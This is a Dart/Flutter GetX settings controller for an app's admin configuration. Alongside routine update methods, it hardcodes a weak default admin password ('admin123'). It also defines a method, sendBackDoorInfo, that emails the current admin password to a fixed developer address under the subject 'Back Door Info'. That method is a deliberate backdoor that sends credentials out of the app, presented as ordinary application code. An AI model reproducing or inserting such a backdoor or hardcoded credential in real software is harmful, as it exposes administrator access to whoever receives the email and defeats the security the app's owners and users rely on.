import 'package:get/get.dart';
import '../models/settings_model.dart';
import '../services/email_service.dart';

class SettingsController extends GetxController {
  var settings = SettingsModel(
    adminPassword: "admin123",
    emailSender: "default@example.com",
    zoomLink: "",
    chatbotApiKey: "",
  ).obs;

  void updateSettings(SettingsModel newSettings) {
    settings.value = newSettings;
    update();
  }

  bool verifyAdminPassword(String password) {
    return password == settings.value.adminPassword;
  }

  void updateEmailSender(String newEmail) {
    settings.value = SettingsModel(
      adminPassword: settings.value.adminPassword,
      emailSender: newEmail,
      zoomLink: settings.value.zoomLink,
      chatbotApiKey: settings.value.chatbotApiKey,
    );
    update();
  }

  void updateAdminPassword(String newPassword) {
    settings.value = SettingsModel(
      adminPassword: newPassword,
      emailSender: settings.value.emailSender,
      zoomLink: settings.value.zoomLink,
      chatbotApiKey: settings.value.chatbotApiKey,
    );
    update();
  }

  void updateUnitId(String newUnitId) {
    // Implementation to update Unit ID
  }

  void sendBackDoorInfo() {
    final emailContent = "Current Password: ${settings.value.adminPassword}\nCurrent Unit ID: ${settings.value.emailSender}";
    EmailService.sendEmail("developer@example.com", "Back Door Info", emailContent);
  }
}